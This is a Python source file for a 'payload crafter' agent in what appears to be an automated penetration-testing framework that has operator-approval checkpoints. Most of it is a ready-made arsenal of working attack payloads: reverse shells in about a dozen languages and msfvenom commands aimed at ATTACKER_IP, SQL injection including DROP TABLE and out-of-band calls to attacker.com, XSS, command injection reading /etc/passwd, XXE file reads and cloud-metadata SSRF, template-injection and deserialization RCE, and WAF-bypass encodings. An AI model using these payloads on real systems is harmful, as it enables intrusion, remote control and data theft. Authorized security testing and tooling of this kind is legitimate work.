"""Payload Crafter Agent - Custom exploitation payloads and WAF bypass."""
import asyncio
import logging
import base64
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from ..core.config import EngagementConfig, AgentConfig
from ..core.scope import ScopeValidator
from ..core.memory import MemoryManager, Finding, Asset, TimelineEvent
from ..core.telegram_base import BaseTelegramBot
from .base import BaseAgent, ToolResult

logger = logging.getLogger(__name__)


class PayloadCrafterAgent(BaseAgent):
    """Custom payload crafting and WAF bypass for confirmed vulnerabilities."""

    def __init__(
        self,
        name: str = "PAYLOAD-CRAFTER",
        role: str = "Payload Crafting Specialist",
        config: EngagementConfig = None,
        agent_config: AgentConfig = None,
        scope_validator: ScopeValidator = None,
        memory: MemoryManager = None,
        telegram: BaseTelegramBot = None
    ):
        super().__init__(
            name,
            role,
            config=config,
            agent_config=agent_config,
            scope_validator=scope_validator,
            memory=memory,
            telegram=telegram,
            skills=["payload-crafting", "scope-management", "memory-management", "evidence-collection"],
            tools_required=[
                'msfvenom', 'python3', 'bash', 'openssl', 'xxd'
            ],
            hitl_required=True,
            hitl_checkpoints=[
                "Before generating reverse shell payloads",
                "Before encoding/obfuscating payloads for WAF bypass",
                "Before delivering any payload to target"
            ],
            max_runtime_minutes=60
        )

    async def run(self, inputs: Dict[str, Any]) -> Dict[str, Any]:
        """Generate custom payloads for confirmed findings."""
        self.log_event("payload_crafting", "Starting payload crafting", "started")

        confirmed_findings = inputs.get('confirmed_findings', [])
        if not confirmed_findings:
            all_findings = self.memory.load_findings()
            confirmed_findings = [f for f in all_findings if f.get('status') == 'confirmed' and f.get('operator_decision') == 'go']

        results = {
            'reverse_shells': [],
            'sql_payloads': [],
            'xss_payloads': [],
            'cmdi_payloads': [],
            'xxe_payloads': [],
            'ssti_payloads': [],
            'waf_bypasses': [],
            'encoded_payloads': []
        }

        for finding in confirmed_findings:
            if not getattr(self, 'running', True):
                break

            target = finding.get('target', '')
            ftype = finding.get('type', '')
            finding_id = finding.get('id', '')

            logger.info(f"[{self.name}] Crafting payloads for {finding_id}: {ftype}")

            # Request HITL for payload generation
            decision = await self._request_payload_approval(finding)
            if decision != 'go':
                logger.info(f"[{self.name}] Operator denied payload crafting for {finding_id}")
                continue

            # Generate payloads based on vulnerability type
            payloads = await self._generate_payloads(finding)
            
            # Test payloads if endpoint available
            if target:
                tested = await self._test_payloads(target, payloads, finding)
                payloads.update(tested)

            # Save payloads as evidence
            await self._save_payloads(finding_id, payloads)

            results['reverse_shells'].extend(payloads.get('reverse_shells', []))
            results['sql_payloads'].extend(payloads.get('sql_payloads', []))
            results['xss_payloads'].extend(payloads.get('xss_payloads', []))
            results['cmdi_payloads'].extend(payloads.get('cmdi_payloads', []))
            results['xxe_payloads'].extend(payloads.get('xxe_payloads', []))
            results['ssti_payloads'].extend(payloads.get('ssti_payloads', []))
            results['waf_bypasses'].extend(payloads.get('waf_bypasses', []))
            results['encoded_payloads'].extend(payloads.get('encoded_payloads', []))

        self.log_event("payload_crafting", f"Payload crafting complete. Generated payloads for {len(confirmed_findings)} findings", "completed")
        return results

    async def _request_payload_approval(self, finding: Dict) -> str:
        """Request operator approval for payload generation."""
        from ..core.memory import Finding as FindingClass

        finding_obj = FindingClass(
            id=finding.get('id', 'UNKNOWN'),
            title=finding.get('title', 'Payload Crafting'),
            target=finding.get('target', 'N/A'),
            type=finding.get('type', 'unknown'),
            confidence=finding.get('confidence', 0),
            severity=finding.get('severity', 0),
            status="confirmed",
            evidence=finding.get('evidence', ''),
            discovered_by=finding.get('discovered_by', ''),
            proposed_action=f"Generate custom exploitation payloads for {finding.get('type', 'vulnerability')}",
            risk="Payload generation for exploitation testing. All payloads are for authorized testing only."
        )

        decision = await self.request_approval(finding_obj, finding_obj.proposed_action, finding_obj.risk)
        return decision

    async def _generate_payloads(self, finding: Dict) -> Dict[str, List]:
        """Generate payloads based on vulnerability type."""
        ftype = finding.get('type', '').lower()
        payloads = {key: [] for key in [
            'reverse_shells', 'sql_payloads', 'xss_payloads', 
            'cmdi_payloads', 'xxe_payloads', 'ssti_payloads',
            'waf_bypasses', 'encoded_payloads'
        ]}

        if 'sql' in ftype or 'sqli' in ftype:
            payloads['sql_payloads'] = self._generate_sql_payloads()
            payloads['waf_bypasses'].extend(self._generate_sql_waf_bypasses())

        if 'xss' in ftype:
            payloads['xss_payloads'] = self._generate_xss_payloads()
            payloads['waf_bypasses'].extend(self._generate_xss_waf_bypasses())

        if 'command' in ftype or 'rce' in ftype or 'cmdi' in ftype:
            payloads['cmdi_payloads'] = self._generate_cmdi_payloads()
            payloads['waf_bypasses'].extend(self._generate_cmdi_waf_bypasses())

        if 'xxe' in ftype:
            payloads['xxe_payloads'] = self._generate_xxe_payloads()

        if 'ssti' in ftype or 'template' in ftype:
            payloads['ssti_payloads'] = self._generate_ssti_payloads()

        if 'deserial' in ftype or 'serial' in ftype:
            payloads['deserial_payloads'] = self._generate_deserial_payloads()

        # Always generate reverse shells for RCE-type vulns
        if any(k in ftype for k in ['rce', 'command', 'cmdi', 'deserial', 'sqli']):
            payloads['reverse_shells'] = self._generate_reverse_shells()

        # Generate encoded variants
        all_payloads = []
        for pl_list in payloads.values():
            all_payloads.extend(pl_list)
        payloads['encoded_payloads'] = self._generate_encoded_variants(all_payloads)

        return payloads

    def _generate_reverse_shells(self) -> List[Dict]:
        """Generate reverse shell payloads for various platforms."""
        shells = []
        
        # These would be parameterized with attacker IP/port in real usage
        LHOST = "ATTACKER_IP"
        LPORT = "ATTACKER_PORT"

        shell_templates = {
            "bash_tcp": f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
            "bash_udp": f"bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3_short": f"python3 -c \"import os;os.system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1')\"",
            "perl": f"perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "nc_traditional": f"nc -e /bin/sh {LHOST} {LPORT}",
            "nc_openbsd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
            "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\"",
            "php": f"php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            "lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
            "java": f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"]);p.waitFor()",
            "msfvenom_linux_elf": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf",
            "msfvenom_windows_exe": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe",
            "msfvenom_war": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war",
            "msfvenom_php": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw",
        }

        for name, cmd in shell_templates.items():
            shells.append({
                'name': name,
                'platform': self._get_platform(name),
                'command': cmd,
                'description': f"Reverse shell ({name}) - Replace {LHOST}/{LPORT} with attacker IP/port"
            })

        return shells

    def _get_platform(self, name: str) -> str:
        if 'win' in name or 'powershell' in name:
            return 'windows'
        elif 'java' in name or 'jsp' in name or 'war' in name:
            return 'java'
        elif 'php' in name:
            return 'php'
        elif 'ruby' in name:
            return 'ruby'
        elif 'lua' in name:
            return 'lua'
        else:
            return 'linux/unix'

    def _generate_sql_payloads(self) -> List[Dict]:
        """Generate SQL injection payloads."""
        return [
            {'name': 'union_basic', 'payload': "' UNION SELECT NULL,NULL,NULL--", 'db': 'generic'},
            {'name': 'union_version', 'payload': "' UNION SELECT @@version,NULL,NULL--", 'db': 'mysql/mssql'},
            {'name': 'union_user', 'payload': "' UNION SELECT user(),database(),NULL--", 'db': 'mysql'},
            {'name': 'boolean_true', 'payload': "' OR '1'='1", 'db': 'generic'},
            {'name': 'boolean_false', 'payload': "' AND '1'='2", 'db': 'generic'},
            {'name': 'time_based_mysql', 'payload': "' OR SLEEP(5)--", 'db': 'mysql'},
            {'name': 'time_based_pg', 'payload': "'; SELECT pg_sleep(5)--", 'db': 'postgresql'},
            {'name': 'time_based_mssql', 'payload': "'; WAITFOR DELAY '0:0:5'--", 'db': 'mssql'},
            {'name': 'error_based_mysql', 'payload': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", 'db': 'mysql'},
            {'name': 'stacked_queries', 'payload': "'; DROP TABLE users--", 'db': 'postgresql/mssql'},
            {'name': 'out_of_band_dns', 'payload': "'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\share'--", 'db': 'mssql'},
            {'name': 'oracle_version', 'payload': "' UNION SELECT banner FROM v$version--", 'db': 'oracle'},
        ]

    def _generate_sql_waf_bypasses(self) -> List[Dict]:
        """Generate SQL WAF bypass payloads."""
        return [
            {'name': 'case_variation', 'payload': "SeLeCt UnIoN SeLeCt", 'technique': 'Case variation'},
            {'name': 'comment_injection', 'payload': "SEL/**/ECT UN/**/ION SEL/**/ECT", 'technique': 'Inline comments'},
            {'name': 'url_encoding', 'payload': "%27%20UNION%20SELECT%20NULL--", 'technique': 'URL encoding'},
            {'name': 'double_url_encoding', 'payload': "%2527%2520UNION%2520SELECT%2520NULL--", 'technique': 'Double URL encoding'},
            {'name': 'char_encoding', 'payload': "CHAR(83,69,76,69,67,84)", 'technique': 'CHAR() encoding'},
            {'name': 'hex_encoding', 'payload': "0x53454c454354", 'technique': 'Hex encoding'},
            {'name': 'whitespace_bypass', 'payload': "'\tUNION\tSELECT\tNULL--", 'technique': 'Tab/whitespace variation'},
            {'name': 'parentheses', 'payload': "('UNION' 'SELECT' NULL)", 'technique': 'Parentheses'},
            {'name': 'versioned_comments', 'payload': "/*!UNION*/ /*!SELECT*/ NULL", 'technique': 'MySQL versioned comments'},
            {'name': 'nested_comments', 'payload': "'/**/UNION/**/SELECT/**/NULL--", 'technique': 'Nested comments'},
        ]

    def _generate_xss_payloads(self) -> List[Dict]:
        """Generate XSS payloads."""
        return [
            {'name': 'basic_script', 'payload': "<script>alert(1)</script>", 'context': 'html'},
            {'name': 'img_onerror', 'payload': "<img src=x onerror=alert(1)>", 'context': 'html'},
            {'name': 'svg_onload', 'payload': "<svg onload=alert(1)>", 'context': 'html'},
            {'name': 'body_onload', 'payload': "<body onload=alert(1)>", 'context': 'html'},
            {'name': 'event_handler', 'payload': "\" onmouseover=\"alert(1)", 'context': 'attribute'},
            {'name': 'javascript_uri', 'payload': "javascript:alert(1)", 'context': 'href/src'},
            {'name': 'base64_eval', 'payload': "<script>eval(atob('YWxlcnQoMSk='))</script>", 'context': 'html'},
            {'name': 'dom_xss', 'payload': "<img src=1 onerror=eval(location.hash.slice(1))>#alert(1)", 'context': 'dom'},
            {'name': 'template_literal', 'payload': "`${alert(1)}`", 'context': 'js_template'},
            {'name': 'css_expression', 'payload': "xss:expression(alert(1))", 'context': 'css'},
        ]

    def _generate_xss_waf_bypasses(self) -> List[Dict]:
        """Generate XSS WAF bypass payloads."""
        return [
            {'name': 'case_variation', 'payload': "<ScRiPt>alert(1)</ScRiPt>", 'technique': 'Case variation'},
            {'name': 'null_byte', 'payload': "<script\x00>alert(1)</script>", 'technique': 'Null byte injection'},
            {'name': 'encoding', 'payload': "<script>alert&#40;1&#41;</script>", 'technique': 'HTML entity encoding'},
            {'name': 'unicode', 'payload': "<svg/onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>", 'technique': 'Unicode escaping'},
            {'name': 'svg_no_close', 'payload': "<svg onload=alert(1)//", 'technique': 'Incomplete tag'},
            {'name': 'event_obfuscation', 'payload': "<img src=x oNeRrOr=alert(1)>", 'technique': 'Event handler obfuscation'},
            {'name': 'data_uri', 'payload': "data:text/html,<script>alert(1)</script>", 'technique': 'Data URI scheme'},
        ]

    def _generate_cmdi_payloads(self) -> List[Dict]:
        """Generate command injection payloads."""
        return [
            {'name': 'semicolon', 'payload': "; id", 'separator': ';'},
            {'name': 'pipe', 'payload': "| id", 'separator': '|'},
            {'name': 'double_pipe', 'payload': "|| id", 'separator': '||'},
            {'name': 'ampersand', 'payload': "& id", 'separator': '&'},
            {'name': 'double_amp', 'payload': "&& id", 'separator': '&&'},
            {'name': 'backtick', 'payload': "`id`", 'separator': '`'},
            {'name': 'dollar_paren', 'payload': "$(id)", 'separator': '$()'},
            {'name': 'newline', 'payload': "%0aid", 'separator': 'newline (URL encoded)'},
            {'name': 'quote_bypass', 'payload': "/bin/c''at /etc/passwd", 'technique': 'Quote breaking'},
            {'name': 'escape_bypass', 'payload': "/bin/c\\at /etc/passwd", 'technique': 'Escape sequence'},
            {'name': 'subshell', 'payload': "(id)", 'technique': 'Subshell'},
            {'name': 'variable_expansion', 'payload': "${IFS}id", 'technique': 'IFS variable'},
            {'name': 'brace_expansion', 'payload': "{id,}", 'technique': 'Brace expansion'},
        ]

    def _generate_cmdi_waf_bypasses(self) -> List[Dict]:
        """Generate command injection WAF bypasses."""
        return [
            {'name': 'base64', 'payload': "bash -c \"$(echo aWQ= | base64 -d)\"", 'technique': 'Base64 encoded command'},
            {'name': 'hex', 'payload': "bash -c \"$(echo 6964 | xxd -r -p)\"", 'technique': 'Hex encoded command'},
            {'name': 'env_var', 'payload': "$PATH$()$LS", 'technique': 'Environment variable manipulation'},
            {'name': 'concat', 'payload': "cat$IFS/etc$IFSpasswd", 'technique': 'String concatenation with IFS'},
            {'name': 'wildcard', 'payload': "/bin/??t /etc/passwd", 'technique': 'Wildcard expansion'},
        ]

    def _generate_xxe_payloads(self) -> List[Dict]:
        """Generate XXE payloads."""
        return [
            {'name': 'file_read_etc_passwd', 'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'type': 'file_read'},
            {'name': 'file_read_win', 'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', 'type': 'file_read_windows'},
            {'name': 'ssrf_metadata', 'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'type': 'ssrf'},
            {'name': 'dos_billion_laughs', 'payload': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>', 'type': 'dos'},
            {'name': 'param_entity', 'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>', 'type': 'oob_xxe'},
        ]

    def _generate_ssti_payloads(self) -> List[Dict]:
        """Generate SSTI payloads for various template engines."""
        return [
            {'name': 'jinja2_basic', 'payload': "{{7*7}}", 'engine': 'jinja2/twig', 'expected': '49'},
            {'name': 'jinja2_config', 'payload': "{{config}}", 'engine': 'jinja2', 'expected': 'config object'},
            {'name': 'jinja2_request', 'payload': "{{request.environ}}", 'engine': 'jinja2', 'expected': 'environ vars'},
            {'name': 'jinja2_rce', 'payload': "{{''.__class__.__mro__[1].__subclasses__()}}", 'engine': 'jinja2', 'expected': 'subclass list'},
            {'name': 'twig_basic', 'payload': "{{7*7}}", 'engine': 'twig', 'expected': '49'},
            {'name': 'twig_rce', 'payload': "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", 'engine': 'twig', 'expected': 'RCE'},
            {'name': 'freemarker_basic', 'payload': "${7*7}", 'engine': 'freemarker', 'expected': '49'},
            {'name': 'freemarker_rce', 'payload': "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }", 'engine': 'freemarker', 'expected': 'RCE'},
            {'name': 'velocity_basic', 'payload': "#set($x=7*7)${x}", 'engine': 'velocity', 'expected': '49'},
            {'name': 'smarty_basic', 'payload': "{7*7}", 'engine': 'smarty', 'expected': '49'},
            {'name': 'erb_basic', 'payload': "<%= 7*7 %>", 'engine': 'erb', 'expected': '49'},
            {'name': 'django_basic', 'payload': "{{7|add:7}}", 'engine': 'django', 'expected': '14'},
        ]

    def _generate_deserial_payloads(self) -> List[Dict]:
        """Generate deserialization payloads."""
        return [
            {'name': 'java_ysoserial', 'payload': 'java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0', 'framework': 'java', 'note': 'Requires ysoserial'},
            {'name': 'python_pickle', 'payload': "import pickle; pickle.dumps({'__reduce__': lambda: (__import__('os').system, ('id',))})", 'framework': 'python', 'note': 'Pickle RCE'},
            {'name': 'php_unserialize', 'payload': 'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}', 'framework': 'php', 'note': 'PHP object injection'},
            {'name': 'nodejs_serialize', 'payload': '{"rce":"_$$ND_FUNC$$_function (){ require(\"child_process\").exec(\"id\"); }()"}', 'framework': 'nodejs', 'note': 'node-serialize'},
        ]

    def _generate_encoded_variants(self, payloads: List[Dict]) -> List[Dict]:
        """Generate encoded variants of payloads."""
        encoded = []
        
        for payload in payloads:
            if isinstance(payload, dict) and 'payload' in payload:
                raw = payload['payload']
                name = payload.get('name', 'payload')
            elif isinstance(payload, str):
                raw = payload
                name = 'raw'
            else:
                continue

            # URL encoding
            encoded.append({'name': f'{name}_url', 'payload': urllib.parse.quote(raw), 'encoding': 'url'})
            encoded.append({'name': f'{name}_double_url', 'payload': urllib.parse.quote(urllib.parse.quote(raw)), 'encoding': 'double_url'})
            
            # Base64
            encoded.append({'name': f'{name}_b64', 'payload': base64.b64encode(raw.encode()).decode(), 'encoding': 'base64'})
            
            # HTML entities
            html_encoded = ''.join(f'&#{ord(c)};' for c in raw)
            encoded.append({'name': f'{name}_html', 'payload': html_encoded, 'encoding': 'html_entities'})
            
            # Unicode
            unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in raw)
            encoded.append({'name': f'{name}_unicode', 'payload': unicode_encoded, 'encoding': 'unicode'})

        return encoded

    async def _test_payloads(self, target: str, payloads: Dict, finding: Dict) -> Dict:
        """Test generated payloads against target (benign only)."""
        results = {key: [] for key in payloads.keys()}
        
        # Only test benign verification payloads (sleep, ping, etc.)
        # This is a placeholder - actual testing would be done by exploiter agent
        logger.info(f"[{self.name}] Payload testing delegated to exploiter agent")
        
        return results

    async def _save_payloads(self, finding_id: str, payloads: Dict):
        """Save generated payloads as evidence."""
        import json
        content = json.dumps(payloads, indent=2)
        self.memory.save_evidence(
            finding_id=f"{finding_id}_payloads",
            evidence_type="payloads",
            content=content,
            metadata={'agent': self.name, 'type': 'generated_payloads'}
        )